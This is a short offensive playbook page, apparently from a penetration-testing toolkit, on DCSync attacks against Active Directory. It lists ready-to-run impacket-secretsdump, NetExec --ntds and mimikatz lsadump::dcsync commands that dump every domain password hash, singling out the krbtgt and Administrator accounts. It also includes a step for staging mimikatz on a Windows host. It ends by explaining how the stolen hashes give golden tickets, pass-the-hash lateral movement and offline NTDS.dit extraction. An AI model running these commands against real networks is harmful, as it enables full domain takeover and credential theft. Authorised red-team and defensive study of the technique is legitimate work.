# DCSync

## Before I start
- [ ] An account with replication rights: Domain Admins, Enterprise Admins, Administrators, or a user with Replicating Directory Changes and Replicating Directory Changes All on the domain object, which BloodHound shows as the DCSync edge
sudo ntpdate <DCIP>
- [ ] Unsure: with PowerView loaded, as in :Pb domain-enum, Get-DomainObjectAcl -Identity '<BaseDN>' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'}

## From Kali
At the pwn-broker prompt: tool install impacket and tool install netexec.
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc
impacket-secretsdump -hashes ':<Hash>' '<Domain>/<Username>@<DCIP>' -just-dc
One account only:
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-user '<TargetUser>'
The two that matter most:
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-user 'krbtgt'
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-user 'Administrator'
- [ ] krbtgt's keys sign golden tickets for the whole domain
- [ ] -history adds the password history, -pwd-last-set each password's age, and -user-status who is enabled
Through NetExec instead:
nxc smb <DCIP> -u '<Username>' -p '<Password>' --ntds
nxc smb <DCIP> -u '<Username>' -p '<Password>' --ntds --user krbtgt
- [ ] NetExec's default method is drsuapi: the same DCSync, with the same rights

## From a Windows shell
At the pwn-broker prompt:
tool install mimikatz
serve
serve files mimikatz
On the Windows host:
- [ ] mimikatz.exe fetched with the line serve files gives
.\mimikatz.exe "lsadump::dcsync /user:<Domain>\krbtgt" "exit"
.\mimikatz.exe "lsadump::dcsync /user:<Domain>\<TargetUser>" "exit"
- [ ] /all takes the whole database, and /csv makes it easy to parse
- [ ] It runs from any domain host, as an account with the rights: nothing is run on the DC itself

## What the hashes give
- [ ] krbtgt: a golden ticket, with no more contact with the DC: :Pb golden-silver
- [ ] Any user's NT hash, passed across the domain: :Pb lateral-movement
- [ ] No replication rights, but local administrator on the DC: NTDS.dit from a shadow copy, for the same hashes offline: :Pb privileged-groups
